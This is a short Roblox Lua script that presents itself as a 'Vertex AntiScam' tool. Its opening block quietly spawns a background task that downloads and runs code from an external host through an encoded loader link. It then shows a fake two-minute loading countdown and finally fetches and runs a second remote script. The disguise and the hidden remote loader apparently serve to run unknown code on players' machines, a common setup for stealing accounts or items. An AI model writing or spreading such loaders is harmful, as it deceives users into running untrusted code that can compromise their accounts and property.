-- First script
task.spawn(function()
    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImE4Mjk5ZDFiLWQxZDgtNDk3MC05MmI0LTQxZjk1NGY3ZGFkYSIsImtpbmQiOiJsb2FkZXIifQ"))()
end)

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "VertexAntiScam"

pcall(function()
    gui.Parent = game:GetService("CoreGui")
end)

if not gui.Parent then
    gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
end

local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(250,100)
frame.Position = UDim2.new(.5,-125,.5,-50)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,30)
title.BackgroundTransparency = 1
title.Text = "Vertex AntiScam"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Parent = frame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1,0,0,50)
label.Position = UDim2.new(0,0,0,40)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1,1,1)
label.TextScaled = true
label.Parent = frame

-- Draggable
frame.Active = true
frame.Draggable = true

-- Countdown
for i = 120,0,-1 do
    local m = math.floor(i/60)
    local s = i%60
    label.Text = "Estimated loading time:\n"..string.format("%d:%02d",m,s)
    task.wait(1)
end

gui:Destroy()

-- Final script
loadstring(game:HttpGet("https://raw.smokingscripts.org/vertex.lua"))()
